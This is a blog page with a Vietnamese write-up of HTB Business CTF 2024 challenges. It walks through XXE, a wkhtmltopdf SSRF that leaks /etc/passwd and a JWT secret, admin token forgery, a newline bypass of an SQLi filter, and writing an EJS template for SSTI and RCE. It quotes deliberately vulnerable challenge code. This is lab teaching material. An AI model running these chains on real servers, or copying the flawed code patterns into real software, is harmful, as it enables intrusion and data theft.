@@ -1,0 +1,2205 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Htb business ctf 2024 the vault of hope - solved challenges in time - Zoltán&#39;s Blog</title>
+  <meta name="description" content="Solved challenges Web/Jailbreak  Mở đầu các chall web bằng một bài black box khá đơn giản. Trang web có khá nhiều page render client side và không tương tác với server trừ chức năng update firmware với định dạng file xml.   Nhìn vào thì ta sẽ nghĩ ngay đến vul XXE external entity injection để đọc file trên hệ thống. Quan sát kĩ hơn bằng việc chặn proxy :    Post method với /api/update nhận file xml và trả ra nội dung update version nằm trong một thẻ của file xml vì vậy có thể đoán nôm na rằng server sẽ hiển thị nội dung của tag Version.">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2024-05-18-htbbusinessctf2024\/",
+          "name": "Htb business ctf 2024 the vault of hope solved challenges in time"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "Htb business ctf 2024 the vault of hope - solved challenges in time",
+  "description" : "Solved challenges Web\/Jailbreak  Mở đầu các chall web bằng một bài black box khá đơn giản. Trang web có khá nhiều page render client side và không tương tác với server trừ chức năng update firmware với định dạng file xml.   Nhìn vào thì ta sẽ nghĩ ngay đến vul XXE external entity injection để đọc file trên hệ thống. Quan sát kĩ hơn bằng việc chặn proxy :    Post method với \/api\/update nhận file xml và trả ra nội dung update version nằm trong một thẻ của file xml vì vậy có thể đoán nôm na rằng server sẽ hiển thị nội dung của tag Version.",
+  "inLanguage" : "en",
+  "wordCount":  7617 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2024-05-18-htbbusinessctf2024\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="Htb business ctf 2024 the vault of hope - solved challenges in time" />
+<meta property="og:description" content="Solved challenges Web/Jailbreak  Mở đầu các chall web bằng một bài black box khá đơn giản. Trang web có khá nhiều page render client side và không tương tác với server trừ chức năng update firmware với định dạng file xml.   Nhìn vào thì ta sẽ nghĩ ngay đến vul XXE external entity injection để đọc file trên hệ thống. Quan sát kĩ hơn bằng việc chặn proxy :    Post method với /api/update nhận file xml và trả ra nội dung update version nằm trong một thẻ của file xml vì vậy có thể đoán nôm na rằng server sẽ hiển thị nội dung của tag Version.">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/write-up/2024-05-18-htbbusinessctf2024/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="Htb business ctf 2024 the vault of hope - solved challenges in time" />
+  <meta name="twitter:description" content="Solved challenges Web/Jailbreak  Mở đầu các chall web bằng một bài black box khá đơn giản. Trang web có khá nhiều page render client side và không tương tác với server trừ chức năng update firmware …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>Htb business ctf 2024 the vault of hope - solved challenges in time</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h1 id="solved-challenges">Solved challenges</h1>
+<h2 id="webjailbreak">Web/Jailbreak</h2>
+<p><img src="https://hackmd.io/_uploads/BJoEs2o7C.png" alt="image"></p>
+<ul>
+<li>Mở đầu các chall web bằng một bài black box khá đơn giản.</li>
+<li>Trang web có khá nhiều page render client side và không tương tác với server trừ chức năng update firmware với định dạng file xml.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/rkd6DniQA.png" alt="image"></p>
+<ul>
+<li>Nhìn vào thì ta sẽ nghĩ ngay đến vul XXE external entity injection để đọc file trên hệ thống.</li>
+<li>Quan sát kĩ hơn bằng việc chặn proxy :</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/B1gZK2jQA.png" alt="image"></p>
+<ul>
+<li>
+<p>Post method với <code>/api/update</code> nhận file xml và trả ra nội dung update version nằm trong một thẻ của file xml vì vậy có thể đoán nôm na rằng server sẽ hiển thị nội dung của tag <code>Version</code>.</p>
+</li>
+<li>
+<p>Tiến hành khai thác lỗi mình tạo một entity truy xuất đến <code>file:///flag.txt</code> trên hệ thống sau đó hiện thị nội dung của nó ở <code>&amp;xxe;</code> để tra ra output.</p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/r1Vr5nom0.png" alt="image"></p>
+<ul>
+<li>Thành công nhận flag, nếu mà server không xử lí tag nào trong xml thì có thể dùng OOB để trả kết quả ra domain của mình.</li>
+</ul>
+<p>Flag : <code>HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_93b9aa9d1cfdfb143ffab196aca78f35}</code></p>
+<h2 id="webblueprint-heist">Web/Blueprint Heist</h2>
+<p><img src="https://hackmd.io/_uploads/S1j1hhjXC.png" alt="image"></p>
+<ul>
+<li>
+<p>Tiếp theo là một bài white-box với source <code>**nodejs+graphql+ejs template**</code></p>
+</li>
+<li>
+<p>Bài này chain khá nhiều vul cụ thể ta phải tận dụng 3 lỗi để RCE.</p>
+</li>
+</ul>
+<h3 id="reconnaissance--detect">Reconnaissance + detect</h3>
+<ul>
+<li>
+<p>Đặt bản thân với tư các người dùng thì mình sẽ test qua các chức năng chính của trang web.</p>
+</li>
+<li>
+<p>Giao diện chỉ đơn giản như dưới đây:
+<img src="https://hackmd.io/_uploads/SyrqpnjQC.png" alt="image"></p>
+</li>
+<li>
+<p>Khi click vào 2 mục thì sẽ tải các file pdf từng phần liên quan của các mục về máy mình.</p>
+</li>
+<li>
+<p>View nhanh qua các api được gọi:</p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HkcVA2om0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rkxc3RhoQC.png" alt="image"></p>
+<ul>
+<li>
+<p>Tiêu biểu ở đây nhất là api /download nhận param token và body là url đường dẫn trực tiếp-&gt; nghi nghi ssrf ở đâu đây :/</p>
+</li>
+<li>
+<p>Mình sẽ đi luôn vào source code để làm sáng tỏ những api trên.</p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/ByC3J6jmC.png" alt="image"></p>
+<ul>
+<li>Mục tiêu của bài này là đọc file flag nằm tại <code>/root/flag</code> -&gt; có 2 cách để tiếp cận, 1 là đọc trực tiếp nó, 2 là run <code>/readflag</code> có chức năng đọc file trên.</li>
+</ul>
+<pre><code> //index.js
+app.set(&quot;view engine&quot;, &quot;ejs&quot;);
+app.use('/static', express.static(path.join(__dirname, 'static')));
+
+app.use(internalRoutes)
+app.use(publicRoutes)
+
+app.use((res, req, next) =&gt; {
+  const err = generateError(404, &quot;Not Found&quot;)
+  return next(err);
+});
+
+app.use((err, req, res, next) =&gt; {
+  renderError(err, req, res);
+});
+
+</code></pre><ul>
+<li>Có thể thấy web có 2 routes chính là <code>publicRoutes</code> và <code>internalRoutes</code> bên cạnh đó còn 1 middleware <code>generateError</code> để validate một vài lỗi trước khi <code>renderError</code> ở cuối.</li>
+</ul>
+<p><code> Vì ứng dụng viết theo mô hình mvc nên mình sẽ phân thích theo tư duy này luôn</code></p>
+<p>Đi thẳng vào 2 routes này :</p>
+<h4 id="publicroutes">publicRoutes</h4>
+<pre><code>const { authMiddleware, generateGuestToken } = require(&quot;../controllers/authController&quot;)
+const { convertPdf } = require(&quot;../controllers/downloadController&quot;)
+
+router.get(&quot;/&quot;, (req, res) =&gt; {
+    res.render(&quot;index&quot;);
+})
+
+router.get(&quot;/report/progress&quot;, (req, res) =&gt; {
+    res.render(&quot;reports/progress-report&quot;)
+})
+
+router.get(&quot;/report/enviromental-impact&quot;, (req, res) =&gt; {
+    res.render(&quot;reports/enviromental-report&quot;)
+})
+
+router.get(&quot;/getToken&quot;, (req, res, next) =&gt; {
+    generateGuestToken(req, res, next)
+});
+
+router.post(&quot;/download&quot;, authMiddleware(&quot;guest&quot;), (req, res, next) =&gt; {
+    convertPdf(req, res, next)
+})
+
+</code></pre><ul>
+<li>Route này lại chứa 5 routes chính và ở đây có 2 routes quan trọng để khai thác:</li>
+<li><code>/getToken</code> endpoint để generate token cho guest và trả ra trực tiếp cho client. Sử dụng method <code>generateGuestToken</code> nằm trong <code>authController</code> với secret trong <code>.env</code>.</li>
+</ul>
+<pre><code>function generateGuestToken(req, res, next) {
+    const payload = {
+        role: 'user'
+    };
+    jwt.sign(payload, secret, (err, token) =&gt; {
+        if (err) {
+            next(generateError(500, &quot;Failed to generate token.&quot;));;
+        } else {
+            res.send(token);
+        }
+    });
+}
+</code></pre><ul>
+<li><code>/dowload</code> endpoint với method post có vẻ đây là api quan trọng mà ta tìm được ở trên thì tương tự nó dùng method <code>convertPdf</code> và cần phải có auth với guest được, nó sẽ lấy nội dung từ url của mình và lưu thành filepdf.</li>
+</ul>
+<pre><code>const { generateError } = require('./errorController');
+const { isUrl } = require(&quot;../utils/security&quot;)
+const crypto = require('crypto');
+const wkhtmltopdf = require('wkhtmltopdf');
+
+async function convertPdf(req, res, next) {
+    try {
+        const { url } = req.body;
+
+        if (!isUrl(url)) {
+            return next(generateError(400, &quot;Invalid URL&quot;));
+        }
+
+        const pdfPath = await generatePdf(url);
+        res.sendFile(pdfPath, {root: &quot;.&quot;});
+
+    } catch (error) {
+        return next(generateError(500, error.message));
+    }
+}
+
+async function generatePdf(urls) {
+    const pdfFilename = generateRandomFilename();
+    const pdfPath = `uploads/${pdfFilename}`;
+
+    try {
+        await generatePdfFromUrl(urls, pdfPath);
+        return pdfPath;
+    } catch (error) {
+        throw new Error(`Error generating PDF: ${error.stack}`);
+    }
+}
+
+async function generatePdfFromUrl(url, pdfPath) {
+    return new Promise((resolve, reject) =&gt; {
+        wkhtmltopdf(url, { output: pdfPath }, (err) =&gt; {
+            if (err) {
+                console.log(err)
+                reject(err);
+            } else {
+                resolve();
+            }
+        });
+    });
+}
+
+function generateRandomFilename() {
+    const randomString = crypto.randomBytes(16).toString('hex');
+    return `${randomString}.pdf`;
+}
+
+module.exports = { convertPdf };
+</code></pre><h4 id="internalroutes">internalRoutes</h4>
+<pre><code>const { authMiddleware } = require(&quot;../controllers/authController&quot;)
+
+const schema = require(&quot;../schemas/schema&quot;);
+const pool = require(&quot;../utils/database&quot;)
+const { createHandler } = require(&quot;graphql-http/lib/use/express&quot;);
+
+
+router.get(&quot;/admin&quot;, authMiddleware(&quot;admin&quot;), (req, res) =&gt; {
+    res.render(&quot;admin&quot;)
+})
+
+router.all(&quot;/graphql&quot;, authMiddleware(&quot;admin&quot;), (req, res, next) =&gt; {
+    createHandler({ schema, context: { pool } })(req, res, next); 
+});
+</code></pre><ul>
+<li>Routes này chứa 2 routes -&gt; điểm mình sẽ tận dụng là <code>/grapql</code> nhưng routes này cần có auth admin và chấp nhận tất cả các method http.</li>
+</ul>
+<pre><code>const { GraphQLObjectType, GraphQLSchema, GraphQLString, GraphQLList } = require('graphql');
+const UserType = require(&quot;../models/users&quot;)
+const { detectSqli } = require(&quot;../utils/security&quot;)
+const { generateError } = require('../controllers/errorController');
+
+const RootQueryType = new GraphQLObjectType({
+  name: 'Query',
+  fields: {
+    getAllData: {
+      type: new GraphQLList(UserType),
+      resolve: async(parent, args, { pool }) =&gt; {
+        let data;
+        const connection = await pool.getConnection();
+        try {
+            data = await connection.query(&quot;SELECT * FROM users&quot;).then(rows =&gt; rows[0]);
+        } catch (error) {
+            generateError(500, error)
+        } finally {
+            connection.release()
+        }
+        return data;
+      }
+    },
+    getDataByName: {
+      type: new GraphQLList(UserType),
+      args: {
+        name: { type: GraphQLString }
+      },
+      resolve: async(parent, args, { pool }) =&gt; {
+        let data;
+        const connection = await pool.getConnection();
+        console.log(args.name)
+        if (detectSqli(args.name)) {
+          return generateError(400, &quot;Username must only contain letters, numbers, and spaces.&quot;)
+        }
+        try {
+            data = await connection.query(`SELECT * FROM users WHERE name like '%${args.name}%'`).then(rows =&gt; rows[0]);
+        } catch (error) {
+            return generateError(500, error)
+        } finally {
+            connection.release()
+        }
+        return data;
+      }
+    }
+  }
+});
+
+const schema = new GraphQLSchema({
+  query: RootQueryType
+});
+
+module.exports = schema;
+
+</code></pre><ul>
+<li>Quan sát src trên ta có thể thấy có khả năng bị sqli ở trên khi truyền vào <code>args-&gt;query</code> nhưng có 1 waf:</li>
+</ul>
+<pre><code>function detectSqli (query) {
+    const pattern = /^.*[!#$%^&amp;*()\-_=+{}\[\]\\|;:'\&quot;,.&lt;&gt;\/?]/
+    return pattern.test(query)
+}
+</code></pre><ul>
+<li>Vấn đề ở đây là bypass waf để SQLi.</li>
+</ul>
+<h4 id="rce">RCE</h4>
+<ul>
+<li>Cùng để ý thì ở <code>index.js</code> có một routes xử lí ngoại lệ(error).</li>
+<li>Middleware sẽ check error và hiển thị với template ejs:</li>
+</ul>
+<pre><code>function generateError(status, message) {
+    const err = new Error(message);
+    err.status = status;
+    return err;
+};
+
+const renderError = (err, req, res) =&gt; {
+    res.status(err.status);
+    const templateDir = __dirname + '/../views/errors';
+    const errorTemplate = (err.status &gt;= 400 &amp;&amp; err.status &lt; 600) ? err.status : &quot;error&quot;
+    let templatePath = path.join(templateDir, `${errorTemplate}.ejs`);
+
+    if (!fs.existsSync(templatePath)) {
+        templatePath = path.join(templateDir, `error.ejs`);
+    }
+    console.log(templatePath)
+    res.render(templatePath, { error: err.message }, (renderErr, html) =&gt; {
+        res.send(html);
+    });
+};
+
+module.exports = { generateError, renderError }
+</code></pre><p>Chú ý <code>const errorTemplate = (err.status &gt;= 400 &amp;&amp; err.status &lt; 600) ? err.status : &quot;error&quot;</code> check status để chọn tên trang hiển thị lỗi.</p>
+<p><img src="https://hackmd.io/_uploads/SkWrKTsQ0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HkvLK6s7R.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1PDYajmC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Hy0vKpjXR.png" alt="image"></p>
+<p>-&gt; Do đó ta sẽ ghi vào 1 file <code>ejs</code> để đọc flag hiển thị khi error vì page sẽ render theo tên status trước.</p>
+<h3 id="exploit-wkhtmltopdf-ssrf">Exploit wkhtmltopdf SSRF</h3>
+<p><code>&quot;wkhtmltopdf&quot;: &quot;^0.4.0&quot;</code></p>
+<p>Searching thì khác nhanh tìm được vul và poc:</p>
+<p><img src="https://hackmd.io/_uploads/BkE99pj7C.png" alt="image"></p>
+<ul>
+<li>Khá giống với DNS binding thì mình sẽ redirect đến <code>file://</code> tùy chỉnh trên hệ thống để <code>wkhtmltopdf</code> convert file đó sang dạng pdf và truy xuất nội dung.</li>
+<li>Tạo server attack + public host with ngrok:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BJNTspoQC.png" alt="image"></p>
+<ul>
+<li>Thành công lấy được nội dung <code>/etc/passwd</code></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/r1DenpimR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BJZBnpiQC.png" alt="image"></p>
+<h3 id="leak-secret_key-jwt---authenticate-to-admin-user">Leak secret_key jwt -&gt; authenticate to admin user.</h3>
+<ul>
+<li>Để truy cập được <code>/graphql</code> endpoint thì cần role của mình là <code>admin</code> cho nên ta phải control được jwt.</li>
+<li>Chia sẻ 1 chút là ban đầu mình đọc:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HJAX0Tjm0.png" alt="image"></p>
+<ul>
+<li>Thấy secret nên mình nghĩ có thể leak được với weak secret nhưng mà không được mà quên mất là leak được .env với ssrf ở trên :&gt; ( phản xạ quá chậm:(( )</li>
+<li>Ok thì tương tự mình leak được <code>/app/.env</code></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/ryxm1AiQC.png" alt="image"></p>
+<p><code>secret=Str0ng_K3y_N0_l3ak_pl3ase?</code></p>
+<ul>
+<li>Giả mạo token admin với secret_key ở trên:
+<img src="https://hackmd.io/_uploads/SkhtOH370.png" alt="image"></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/rkRnOShXC.png" alt="image"></p>
+<ul>
+<li>
+<p>Cũng có thể dùng 1 số tool để tạo
+<img src="https://hackmd.io/_uploads/rkjGivn70.png" alt="image"></p>
+</li>
+<li>
+<p>Dùng token này để access đến endpoint <code>/graphql</code> nhưng lưu ý là server check <code>localhost</code></p>
+</li>
+</ul>
+<pre><code>function checkInternal(req) {
+    const address = req.socket.remoteAddress.replace(/^.*:/, '')
+    return address === &quot;127.0.0.1&quot;
+}
+</code></pre><ul>
+<li>Do đó ta sẽ phải access thông qua bug ssrf ở trên.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/SJEG3wh7R.png" alt="image"></p>
+<h3 id="exploit-sqli-bypass-waf">Exploit Sqli bypass waf</h3>
+<ul>
+<li>Chức năng dành cho <code>internal user</code> để truy xuất ra cơ sở dữ liệu với param <code>query</code>.</li>
+<li>Regex check <code>^.*[!#$%^&amp;*()\-_=+{}\[\]\\|;:'\&quot;,.&lt;&gt;\/?]</code>.</li>
+<li>Nhìn đến này thì ta nhớ đến bài ssti với ruby(ERB) trong HTB cũng có loại này và ta sẽ bypass với <code>\n</code> vì tất cả những kí tự ở dòng mới sẽ không bị <code>test</code>.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HyIqIpjXR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BkFUwps70.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ryzYxt3QC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SynYethXC.png" alt="image"></p>
+<ul>
+<li>Thử dùng hàm <code>loadfile</code> trong mysql thì thành công leak được các file hệ thống nhưng có vẻ không có quyền root với user db.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/SyI6XKnQ0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rJn07FnQA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1c6QF37R.png" alt="image"></p>
+<p>-&gt; Hook ở đây với bug tiếp theo là mình sẽ lợi dùng hàm <code>writefile</code> để ghi vào template ejs để exploit SSTI.</p>
+<h3 id="ssti-in-ejs-template-via-sqli">SSTI in ejs template via sqli</h3>
+<ul>
+<li>Nếu chỉ có bug SQLi thì khá khó để RCE được vì chắc chắn sẽ có hạn chế về quyền trên hệ thống nên mình sẽ khai thác thông qua chức năng hiển thị errorPage của trang web.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/H1LNtYhXA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HyvBYt3mC.png" alt="image"></p>
+<ul>
+<li>Sau vài lần tạo thì mình đã tạo mới file <code>404.ejs</code> và ghi nội dung từ hook sqli ở trên</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/Bk5cKYn70.png" alt="image"></p>
+<p>Payload: <code>&lt;%=7*7%&gt;</code>
+<img src="https://hackmd.io/_uploads/ryJ7l9hmR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ryAslcnmA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/B10Byq3QR.png" alt="image"></p>
+<ul>
+<li>Truy cập vào một endpoint không tồn tại để kích hoạt middleware hiển thị 404 <code>Not Found</code> và lúc này sẽ render tên file <code>404.ejs</code> mà mình mới tạo và ghi vào.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HJl6k52X0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1rK0-6XR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rJu9RWa7R.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SJ3sCZTmR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rySb1MTQA.png" alt="image"></p>
+<ul>
+<li>Ngoài ra, còn 1 mẹo khá hay là bạn có thể nối chuỗi nó kiểu như này select &lsquo;l&rsquo;,&lsquo;a&rsquo;,&rsquo;m' into outfile thì ta nhận được chuỗi liền kề <code>abc</code>.</li>
+</ul>
+<h3 id="exploit-chain">Exploit chain</h3>
+<ul>
+<li>Nói khá dài ở trên nên mình xin phép tóm lược lại flow của bài này.</li>
+</ul>
+<ol>
+<li>
+<p>Lợi dụng bug ssrf để đọc file <code>/app/.env</code> để lấy secret -&gt; tạo token với role <code>admin</code></p>
+</li>
+<li>
+<p>Khai thác sqli ở <code>/graphql</code> để ghi vào một file <code>404.ejs</code> <code>notFound</code> nhằm lợi dụng việc render template error của server.</p>
+</li>
+<li>
+<p>Ghi vào file mới trong <code>/app/views/errors/404.ejs</code> với syntax ejs và RCE thành công.</p>
+</li>
+</ol>
+<p><img src="https://hackmd.io/_uploads/HJ71zfamA.png" alt="image">
+<img src="https://hackmd.io/_uploads/SktxzMam0.png" alt="image"></p>
+<p><code>secret=Str0ng_K3y_N0_l3ak_pl3ase?</code></p>
+<p><img src="https://hackmd.io/_uploads/S1MBMzpQC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/H1QuMGTm0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/B1uiMM6XA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BJ4AGGamC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Sy_eQMTm0.png" alt="image"></p>
+<p>Flag: <code>HTB{ch41ning_m4st3rs_b4y0nd_1m4g1nary_fb9b1487d1761dfa224ee888e57fcefd}</code></p>
+<p><img src="https://hackmd.io/_uploads/SyRO4GpmA.png" alt="image"></p>
+<p>Chắc sẽ có thắc mắc sao không được file /root/flag.txt luôn từ ssrf nhưng mà mình đã test thử không được có vẻ như là userdb không có quyền truy cập vào /root thay vào đó thì user web lại có quyền này:</p>
+<p><img src="https://hackmd.io/_uploads/HJqfXU3XR.png" alt="image"></p>
+<h1 id="giải-này-phần-misc-có-khá-nhiều-bài-web-với-mức-độ-tầm-medium--easy">Giải này phần MISC có khá nhiều bài web với mức độ tầm medium + easy</h1>
+<h2 id="miscchrono-mind">MISC/Chrono Mind</h2>
+<p><img src="https://hackmd.io/_uploads/HJsTbCoQA.png" alt="image"></p>
+<ul>
+<li>Một bài white-box với source python khá mới với mô hình hoạt động khá giống với nhiều con AI hiện nay như chat-gpt, gemini,&hellip;</li>
+<li>Đầu tiên mình nghĩ do đây là misc nên chắc sẽ dạng LLM (promt injection mới nổi dạo gần đây :/) nhưng mà không anh <code>Ngọc</code> nói nó chỉ là path travesal thôi :\ .</li>
+<li>Đúng như vậy thật vì mình không thấy web call api nào khác.</li>
+</ul>
+<pre><code>// main.py
+from fastapi import FastAPI, Request
+from fastapi.staticfiles import StaticFiles
+from routes.api import router as api_router
+from fastapi.responses import FileResponse, JSONResponse, RedirectResponse
+from config import Config
+
+app = FastAPI(title=&quot;main app&quot;, docs_url=None, redoc_url=None)
+api = FastAPI(title=&quot;api app&quot;, docs_url=None, redoc_url=None)
+
+api.include_router(api_router)
+
+app.mount(&quot;/api&quot;, api)
+
+@app.get('/chat/{room}')
+def chat(room: str):
+    if not room or room != Config.roomID:
